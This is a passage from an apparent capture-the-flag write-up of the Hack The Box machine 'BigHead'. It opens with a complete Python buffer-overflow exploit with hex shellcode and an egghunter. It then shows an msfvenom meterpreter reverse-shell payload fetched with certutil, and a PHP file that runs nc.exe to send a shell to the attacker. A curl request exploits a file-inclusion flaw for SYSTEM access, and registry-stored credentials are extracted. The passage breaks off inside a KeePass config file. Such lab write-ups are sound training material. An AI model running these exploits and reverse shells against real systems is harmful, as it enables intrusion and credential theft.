<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">host = <span class="string">'10.10.10.112'</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">egg = <span class="string">'R1ck'</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">buf =  <span class="string">""</span></span><br><span class="line">buf += <span class="string">"d9c7d97424f45a2bc9bb9f0948"</span></span><br><span class="line">buf += <span class="string">"3bb15283c204315a1303c51aaa"</span></span><br><span class="line">buf += <span class="string">"ce05f4a831f505cdb81034cddf"</span></span><br><span class="line">buf += <span class="string">"5167fd94378476f8a31ffad5c4"</span></span><br><span class="line">buf += <span class="string">"a8b103eb29e9706aaaf0a44c93"</span></span><br><span class="line">buf += <span class="string">"3ab98dd42730df8d2ce7cfba79"</span></span><br><span class="line">buf += <span class="string">"3464f06c3c99418e6d0cd9c9ad"</span></span><br><span class="line">buf += <span class="string">"af0e62e4b7534fbe4ca73b4184"</span></span><br><span class="line">buf += <span class="string">"f9c4eee93537ee2ef1a8854601"</span></span><br><span class="line">buf += <span class="string">"549e9d7b822b05db418be1dd86"</span></span><br><span class="line">buf += <span class="string">"4a62d163182cf672cd4702fef0"</span></span><br><span class="line">buf += <span class="string">"878244d703ce1f7612aace8744"</span></span><br><span class="line">buf += <span class="string">"15ae2d0fb8bb5f52d508526c25"</span></span><br><span class="line">buf += <span class="string">"07e51f17885db71b4178405b78"</span></span><br><span class="line">buf += <span class="string">"3cdea2833df760d76d6f4058e6"</span></span><br><span class="line">buf += <span class="string">"6f6d8da93fc17e0aefa12ee2e5"</span></span><br><span class="line">buf += <span class="string">"2d101206e439b9fd6f4c34ee74"</span></span><br><span class="line">buf += <span class="string">"384a108e81c3f6fae185a19298"</span></span><br><span class="line">buf += <span class="string">"8f3902641a4404eea9b9cb07c7"</span></span><br><span class="line">buf += <span class="string">"a9bce792936bf708bbf06ad73b"</span></span><br><span class="line">buf += <span class="string">"7e97406cd76999f8c5d0331e14"</span></span><br><span class="line">buf += <span class="string">"847c9ac375822381c2a0335fca"</span></span><br><span class="line">buf += <span class="string">"ec670f9dbad1e9770d8ba324c7"</span></span><br><span class="line">buf += <span class="string">"5b3507d81d3a42aec18b3bf7fe"</span></span><br><span class="line">buf += <span class="string">"24acff87584cff52d97c4afe48"</span></span><br><span class="line">buf += <span class="string">"15136bc978a4460e852762ef72"</span></span><br><span class="line">buf += <span class="string">"3707ea3ffff486506afa3550bf"</span></span><br><span class="line"></span><br><span class="line">shellcode = (egg * <span class="number">2</span>) + binascii.unhexlify(buf)</span><br><span class="line">egghunter = <span class="string">"6681caff0f42526a0258cd2e3c055a74efb8"</span> + binascii.hexlify(egg) + <span class="string">"8bfaaf75eaaf75e7ffe7"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_shellcode</span><span class="params">(N,host,port,egg,shellcode)</span>:</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"\033[32m [*] Sending Shellcode"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,<span class="number">0</span>)</span><br><span class="line">		s.connect((host,port))</span><br><span class="line">		s.send(<span class="string">"POST / HTTP/1.1\r\n"</span>)</span><br><span class="line">		s.send(<span class="string">"Host: dev.bighead.htb\r\n"</span>)</span><br><span class="line">		s.send(<span class="string">"Content-Length: %s\r\n"</span>%len(shellcode))</span><br><span class="line">		s.send(<span class="string">"\r\n"</span>)</span><br><span class="line">		s.send(shellcode+<span class="string">"\r\n"</span>)</span><br><span class="line">		s.send(<span class="string">"\r\n"</span>)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'\033[34m'</span> + <span class="string">'['</span> + str(N) + <span class="string">'] '</span> + re.sub(<span class="string">r"\s"</span>,<span class="string">" "</span>,s.recv(<span class="number">12</span>))</span><br><span class="line">		s.close()</span><br><span class="line">		N += <span class="number">1</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"\033[32m [*] Done"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_egghunter</span><span class="params">(host,port,egghunter)</span>:</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"\033[32m [*] Sending EggHunter"</span></span><br><span class="line">	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,<span class="number">0</span>)</span><br><span class="line">	s.connect((host,port))</span><br><span class="line">	s.settimeout(<span class="literal">None</span>)</span><br><span class="line">	s.send(<span class="string">"HEAD /"</span> + (<span class="string">"A"</span>*<span class="number">72</span>) + <span class="string">"f0125062"</span> + egghunter + <span class="string">" HTTP/1.1\r\n"</span>)</span><br><span class="line">	s.send(<span class="string">"Host: dev.bighead.htb\r\n"</span>)</span><br><span class="line">	s.send(<span class="string">"\r\n"</span>)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\033[34m'</span> + re.sub(<span class="string">r"\s"</span>,<span class="string">" "</span>,s.recv(<span class="number">12</span>))</span><br><span class="line">	s.close()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"\033[32m [*] Done"</span></span><br><span class="line"></span><br><span class="line">send_shellcode(N,host,port,egg,shellcode)</span><br><span class="line">send_egghunter(host,port,egghunter)</span><br></pre></td></tr></table></figure>
<p>Now it’s show time, Let’s test the exploit :<br><img src="/images/hackthebox/bighead/83.png" alt=""><br>Perfectly working ! we got a reverse shell.</p>
<h2 id="Enumeration-Enumeration-Enumeration-…"><a href="#Enumeration-Enumeration-Enumeration-…" class="headerlink" title="Enumeration, Enumeration, Enumeration …"></a>Enumeration, Enumeration, Enumeration …</h2><p><img src="/images/hackthebox/bighead/84.png" alt=""><br>We are on the machine as <code>nelson</code>, There is another user on the box called <code>nginx</code> :<br><img src="/images/hackthebox/bighead/85.png" alt=""><br>I checked <code>C:\Users\Nelson</code> and <code>C:\Users\Nelson\Desktop</code> and I found the user flag :<br><img src="/images/hackthebox/bighead/86.png" alt=""><br><img src="/images/hackthebox/bighead/87.png" alt=""><br>2962 bytes? Well … no it’s not the user flag :<br><img src="/images/hackthebox/bighead/88.png" alt=""><br>So we probably we need to be <code>nginx</code> to get the user flag. And of course we can’t access <code>nginx</code> directory :<br><img src="/images/hackthebox/bighead/89.png" alt=""><br>I wanted to upgrade that reverse shell into <code>meterpreter</code> so I had to create the payload first :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter_reverse_tcp LHOST&#x3D;10.10.xx.xx LPORT&#x3D;1338 -f exe &gt; m.exe</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/bighead/90.png" alt=""><br>Then I set up the <code>meterpreter</code> handler :<br><img src="/images/hackthebox/bighead/91.png" alt=""><br>I ran a python simple http server on port 80 : <code>python -m SimpleHTTPServer 80</code> to host the payload. Then I went to <code>C:\Users\Nelson\AppData\Local\Temp</code> and downloaded the payload with <code>certutil</code> :<br><code>certutil -urlcache -split -f http://10.10.xx.xx/m.exe m.exe</code><br><img src="/images/hackthebox/bighead/92.png" alt=""><br>Then I executed it and got a <code>meterpreter</code> session :<br><img src="/images/hackthebox/bighead/93.png" alt=""><br><img src="/images/hackthebox/bighead/94.png" alt=""><br>From <code>meterpreter</code> I wanted to look at the services so I did <code>ps</code>, I looked through them and found an interesting service called <code>BvSshServer.exe</code><br><img src="/images/hackthebox/bighead/95.png" alt=""><br>I wanted to know the listening port of that ssh server, so I did <code>netstat</code>. It was listening on port 2020 :<br><img src="/images/hackthebox/bighead/96.png" alt=""><br>So I forwarded that port, We also saw earlier when we went to <code>code.bighead.htb</code> it redirected us to :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:5080&#x2F;testlink&#x2F;login.php</span><br></pre></td></tr></table></figure>
<p>I wanted to forward that port too to check what’s in there. To forward a port through <code>meterpreter</code> we can simply do it with <code>portfwd</code> :<br><code>portfwd add -l 2020 -p 2020 -r bighead.htb</code></p>
<p><code>portfwd add -l 5080 -p 5080 -r bighead.htb</code></p>
<p><img src="/images/hackthebox/bighead/97.png" alt=""><br>Let’s check if that <code>BvSshServer</code> is a real ssh server :<br><img src="/images/hackthebox/bighead/98.png" alt=""><br>It’s working fine, now we need a password to login. We already know the username : <code>nginx</code>.<br>I went to <code>code.bighead.htb</code> again and after I got redirected to port 5080 on <code>localhost</code> I got some <code>SQL</code> errors :<br><img src="/images/hackthebox/bighead/99.png" alt=""><br><img src="/images/hackthebox/bighead/100.png" alt=""><br>As you can see it disclosed the root path  of the application : <code>C:\xampp</code>. I tried to go there but I got access denied :<br><img src="/images/hackthebox/bighead/101.png" alt=""><br>After a lot of enumeration I checked the <code>registry</code> and in <code>HKLM\System\CurrentControlSet\Services\</code> I found the <code>registry</code> for <code>nignx</code> (The web server) :<br><code>reg enumkey -k &#39;HKLM\System\CurrentControlSet\Services\&#39;</code><br><img src="/images/hackthebox/bighead/102.png" alt=""><br><img src="/images/hackthebox/bighead/103.png" alt=""><br>Then I looked at the values and I found two interesting ones :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg enumkey -k &#39;HKLM\System\CurrentControlSet\Services\nginx</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/bighead/104.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; reg enumkey -k &#39;HKLM\System\CurrentControlSet\Services\nginx&#39;</span><br><span class="line">Enumerating: HKLM\System\CurrentControlSet\Services\nginx</span><br><span class="line"></span><br><span class="line">  Keys (2):</span><br><span class="line"></span><br><span class="line">        Parameters</span><br><span class="line">        Enum</span><br><span class="line"></span><br><span class="line">  Values (12):</span><br><span class="line"></span><br><span class="line">        Type</span><br><span class="line">        Start</span><br><span class="line">        ErrorControl</span><br><span class="line">        ImagePath</span><br><span class="line">        DisplayName</span><br><span class="line">        ObjectName</span><br><span class="line">        Description</span><br><span class="line">        DelayedAutostart</span><br><span class="line">        FailureActionsOnNonCrashFailures</span><br><span class="line">        FailureActions</span><br><span class="line">        Authenticate</span><br><span class="line">        PasswordHash</span><br></pre></td></tr></table></figure>
<p><code>Authenticate</code> and <code>PasswordHash</code>. Let’s look at the value :<br><code>Authenticate</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg queryval -k &#39;HKLM\System\CurrentControlSet\Services\nginx&#39; -v Authenticate</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/bighead/105.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; reg queryval -k &#39;HKLM\System\CurrentControlSet\Services\nginx&#39; -v Authenticate</span><br><span class="line">Key: HKLM\System\CurrentControlSet\Services\nginx</span><br><span class="line">Name: Authenticate</span><br><span class="line">Type: REG_BINARY</span><br><span class="line">Data: 4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000</span><br></pre></td></tr></table></figure>
<p><code>PasswordHash</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg queryval -k &#39;HKLM\System\CurrentControlSet\Services\nginx&#39; -v PasswordHash</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/bighead/106.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; reg queryval -k &#39;HKLM\System\CurrentControlSet\Services\nginx&#39; -v PasswordHash</span><br><span class="line">Key: HKLM\System\CurrentControlSet\Services\nginx</span><br><span class="line">Name: PasswordHash</span><br><span class="line">Type: REG_SZ</span><br><span class="line">Data: 336d72676e6333205361797a205472794861726465722e2e2e203b440a</span><br></pre></td></tr></table></figure>
<p><code>Authenticate</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000</span><br></pre></td></tr></table></figure>
<p><code>PasswordHash</code> : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">336d72676e6333205361797a205472794861726465722e2e2e203b440a</span><br></pre></td></tr></table></figure>
<p>Looks like <code>hex</code>, Let’s see <code>Authenticate</code> :<br><img src="/images/hackthebox/bighead/107.png" alt=""><br>The output was kinda weird, that’s because of the null bytes, I removed them then I got the right output :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4837334270555932557139552d5975677974354659556259302d553837743837</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/bighead/108.png" alt=""><br>So this might be a password : <code>H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87</code>, Let’s check <code>PasswordHash</code> :<br><img src="/images/hackthebox/bighead/109.png" alt=""><br><code>3mrgnc3 sayz TryHarder... ;D</code>, It was just a troll. Anyway we have a password let’s try to login to ssh as <code>nignx</code> :<br><img src="/images/hackthebox/bighead/110.png" alt=""><br>It worked, and by looking at the files I figured out that we are in <code>C:\xampp</code> :<br><img src="/images/hackthebox/bighead/111.png" alt=""><br>There was also a <code>user.txt</code>, I tried to read it but it said that it was a binary file :<br><img src="/images/hackthebox/bighead/112.png" alt=""><br>I wanted to check the user but <code>whoami</code> wasn’t there :<br><img src="/images/hackthebox/bighead/113.png" alt=""><br>So I checked <code>help</code> and this shell has only some basic commands :<br><img src="/images/hackthebox/bighead/114.png" alt=""><br>I know that I’m inside <code>C:\xampp</code> now. But what am I searching for anyway ? I went back to the <code>meterpreter</code> shell and checked the access log of <code>nginx</code> in <code>C:\nginx\logs</code> :<br><img src="/images/hackthebox/bighead/115.png" alt=""><br>At the beginning of the log I found some requests with the <code>user-agent</code> <code>3mrgnc3</code> :<br><img src="/images/hackthebox/bighead/116.png" alt=""><br>Most of them are HEAD requests, maybe he was testing the buffer overflow I don’t really know but anyway we are not looking for that. We are looking for requests to <code>/testlink</code>. Because everything we have access to on port 5080 is under <code>/testlink</code>.<br>On the 7th of October 2018 at 02:17:16 and 02:18:06 I found two POST requests to <code>/testlink/linkto.php</code> :<br><img src="/images/hackthebox/bighead/117.png" alt=""><br>I went to that path and got an error which disclosed the path of the <code>php</code> file :<br><img src="/images/hackthebox/bighead/118.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: <span class="keyword">require_once</span>(): Failed opening required <span class="string">''</span> (include_path=<span class="string">'C:\xampp\php\PEAR;.;C:\xampp\apps\testlink\htdocs\lib\functions\;C:\xampp\apps\testlink\htdocs\lib\issuetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\codetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\reqmgrsystemintegration\;C:\xampp\apps\testlink\htdocs\third_party\') in C:\xampp\apps\testlink\htdocs\linkto.php on line 62</span></span><br></pre></td></tr></table></figure>
<p>The path was <code>C:\xampp\apps\testlink\htdocs\linkto.php</code> So I went there and got the <code>php</code> file :<br><img src="/images/hackthebox/bighead/119.png" alt=""><br><img src="/images/hackthebox/bighead/120.png" alt=""></p>
<h2 id="LFI-in-linkto-php-User-Flag"><a href="#LFI-in-linkto-php-User-Flag" class="headerlink" title="LFI in linkto.php, User Flag"></a>LFI in <code>linkto.php</code>, User Flag</h2><p>It’s a long script so I will just focus on the vulnerable part. First thing I noticed was this comment :<br><img src="/images/hackthebox/bighead/121.png" alt=""><br>So I checked <code>pipercoin.php</code> :<br><img src="/images/hackthebox/bighead/122.png" alt=""><br><code>pipercoin.php</code> :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--                                                                                                                                        </span><br><span class="line">TODO.. I just added a workaround to the linkto script <span class="keyword">for</span> now.                                                                              </span><br><span class="line">Nelson.                                                                                                                                     </span><br><span class="line">--&gt;                                                                                                                                         </span><br><span class="line"><span class="meta">&lt;?php</span>                                                                                                                                       </span><br><span class="line"><span class="keyword">echo</span>(<span class="string">'PiperCoinAuth'</span>);                                                                                                                      </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>Nothing interesting, Let’s go back to <code>linkto.php</code><br>I noticed here that we can send a POST request with the parameters <code>PiperID</code> and <code>PiperCoinID</code> : </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'PiperID'</span>]))&#123;$PiperCoinAuth = $_POST[<span class="string">'PiperCoinID'</span>]; <span class="comment">//plugins/ppiper/pipercoin.php                                         </span></span><br><span class="line">        $PiperCoinSess = base64_decode($PiperCoinAuth);                                                                                     </span><br><span class="line">        $PiperCoinAvitar = (string)$PiperCoinSess;&#125;</span><br></pre></td></tr></table></figure>
<p><code>PiperID</code> is not important but <code>PiperCoinID</code> is. It’s taking the value of <code>PiperCoinID</code> and assigning it to another variable called <code>$PiperCoinAuth</code>. After that it’s calling <a href="https://www.php.net/manual/en/function.require-once.php" target="_blank" rel="noopener"><code>require_once()</code></a> with <code>$PiperCoinAuth</code>.<br><img src="/images/hackthebox/bighead/123.png" alt=""><br>The vulnerability here is obvious. If we can control what’s in <code>require_once()</code> Then we can make it include any <code>php</code> file of our choice (Local File Inclusion).<br>I created a simple <code>php</code> script to execute <code>nc.exe</code> and give me a reverse shell :<br><img src="/images/hackthebox/bighead/124.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">'C:\Users\Nelson\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.xx.xx 1339'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>I uploaded it and uploaded <code>nc.exe</code> to <code>C:\Users\Nelson\AppData\Local\Temp\</code> :<br><img src="/images/hackthebox/bighead/125.png" alt=""><br> Last step is to exploit the vulnerability. We will send a POST request to :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;code.bighead.htb&#x2F;testlink&#x2F;linkto.php</span><br></pre></td></tr></table></figure>
<p>With the parameters <code>PiperID</code> (we can leave it empty) and <code>PiperCoinID</code> which will be the path of the <code>php</code> script : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Nelson\AppData\Local\Temp\rev.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST &quot;http:&#x2F;&#x2F;code.bighead.htb&#x2F;testlink&#x2F;linkto.php&quot; -d &quot;PiperID&#x3D;&amp;PiperCoinID&#x3D;C:\Users\Nelson\AppData\Local\Temp\rev.php&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/bighead/126.png" alt=""><br>We get a reverse shell immediately. As <code>nt authority\system</code> :<br><img src="/images/hackthebox/bighead/127.png" alt=""><br>Awesome now we can get root and user flags, right ? well … no. Let’s get the user flag first :<br><img src="/images/hackthebox/bighead/128.png" alt=""><br>We owned user !</p>
<h2 id="Alternate-Data-Stream-in-root-txt"><a href="#Alternate-Data-Stream-in-root-txt" class="headerlink" title="Alternate Data Stream in root.txt"></a>Alternate Data Stream in <code>root.txt</code></h2><p>Technically we own root now. But we still need to do some more stuff to get the root flag.<br>I looked in <code>C:\Users\Administrator\Desktop</code> and the root flag wasn’t there.<br><img src="/images/hackthebox/bighead/129.png" alt=""><br>I thought it might be hidden, so I tried to read it anyway and yes it was hidden. but …<br><img src="/images/hackthebox/bighead/130.png" alt=""><br>Gilfoyle’s Prayer? Another “Silicon Valley” reference. I terminated the <code>meterpreter</code> session I had as <code>Nelson</code> then I went to <code>C:\Users\Nelson\AppData\Local\Temp</code> and executed <code>m.exe</code> to get another <code>meterpreter</code> session as <code>nt authority\system</code>. After that I uploaded <code>streams.exe</code> to check for alternate data streams on root.txt :<br><img src="/images/hackthebox/bighead/131.png" alt=""><br><img src="/images/hackthebox/bighead/132.png" alt=""><br><img src="/images/hackthebox/bighead/133.png" alt=""><br><code>streams C:\Users\Administrator\Desktop\root.txt</code><br><img src="/images/hackthebox/bighead/134.png" alt=""><br>There is an alternate stream called <code>Zone.Identifier</code>, I tried to read it but <code>type</code> and <code>more</code> didn’t work for some reason.<br><img src="/images/hackthebox/bighead/135.png" alt=""><br><img src="/images/hackthebox/bighead/136.png" alt=""><br>After reading <a href="https://www.howtogeek.com/howto/windows-vista/stupid-geek-tricks-hide-data-in-a-secret-text-file-compartment/" target="_blank" rel="noopener">this article</a> I did it like this : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more &lt; &quot;C:\Users\Administrator\Desktop\root.txt:Zone.Identifier&quot;</span><br></pre></td></tr></table></figure>
<p>And I saved the output to a file and named it <code>test</code><br><img src="/images/hackthebox/bighead/137.png" alt=""><br><img src="/images/hackthebox/bighead/138.png" alt=""><br>When I looked at <code>test</code> I found that it was a binary file :<br><img src="/images/hackthebox/bighead/139.png" alt=""><br>So I downloaded it to use <code>file</code> against it :<br><img src="/images/hackthebox/bighead/140.png" alt=""><br><img src="/images/hackthebox/bighead/141.png" alt=""><br>Keepass password database</p>
<h2 id="Cracking-the-Database-Root-Flag"><a href="#Cracking-the-Database-Root-Flag" class="headerlink" title="Cracking the Database, Root Flag"></a>Cracking the Database, Root Flag</h2><blockquote>
<p>KeePass Password Safe is a free and open-source password manager primarily for Windows. It officially supports macOS and Linux operating systems through the use of Mono. Additionally, there are several unofficial ports for Windows Phone, Android, iOS, and BlackBerry devices. -<a href="https://en.wikipedia.org/wiki/KeePass" target="_blank" rel="noopener">Wikipedia</a></p>
</blockquote>
<p>I renamed the file to <code>test.kdbx</code> :<br><img src="/images/hackthebox/bighead/142.png" alt=""><br>Then I used <code>keepass2</code> to open it :<br><img src="/images/hackthebox/bighead/143.png" alt=""><br><img src="/images/hackthebox/bighead/144.png" alt=""><br>And of course we need a password and a key. I went back to the shell and checked the configuration file for <code>keepass</code> in :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\KeePass</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/bighead/145.png" alt=""><br><img src="/images/hackthebox/bighead/146.png" alt=""><br><code>KeePass.config.xml</code> :</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 